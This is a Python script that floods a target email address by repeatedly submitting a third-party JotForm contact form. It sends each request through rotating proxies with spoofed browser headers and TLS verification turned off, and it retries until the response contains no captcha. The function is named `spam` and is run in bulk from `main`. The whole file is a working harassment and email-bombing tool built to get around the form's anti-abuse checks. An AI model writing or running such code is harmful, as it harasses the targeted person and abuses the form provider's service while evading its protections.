import requests
from requests_toolbelt import MultipartEncoder

from module.data import generate_proxy, main, try_to, get_proxies, test_main, text_body

proxy_generator = generate_proxy(set(get_proxies(r'/proxies_folder/bad_proxies.txt')))


@try_to
def post(target: str = 'softumwork@gmail.com', text_body='test_resuests', proxy=None):
    url = 'https://submit.jotformpro.com/submit/71511869968977/'
    fields = {
        'formID': (None, '71511869968977', None),
        'input_language': (None, 'English (US)', None),
        'q3_name[first]': (None, text_body, None),
        'q3_name[last]': (None, text_body, None),
        'q4_email': (None, target, None),
        'q5_message': (None, text_body, None),
        'simple_spc': (None, '71511869968977-71511869968977', None),
        'event_id': (None, '1658756584758_71511869968977_RN4LwjG', None),
        'temp_upload_folder': (None, '71511869968977_62de9de805a64', None)
    }

    multipart_encoder = MultipartEncoder(fields=fields)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': multipart_encoder.content_type,
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Origin': 'https://form.jotformpro.com',
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua': '"Google Chrome";v="101", "Chromium";v="101", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Connection': 'keep-alive'
    }
    proxies = {'http': proxy, 'https': proxy}
    response = requests.post(
        url,
        headers=headers,
        data=multipart_encoder,
        proxies=proxies,
        timeout=10,
        verify=False
    )
    return response


def spam(target: str):
    result = None
    while result is None:
        proxy = next(generate_proxy(proxy_generator))
        post_resp = post(proxy=proxy, target=target, text_body=text_body)
        if post_resp:
            if 'captcha' not in post_resp.text:
                result = post_resp
    return result, target


if __name__ == '__main__':
    test_main(spam)
    main(spam, 20)
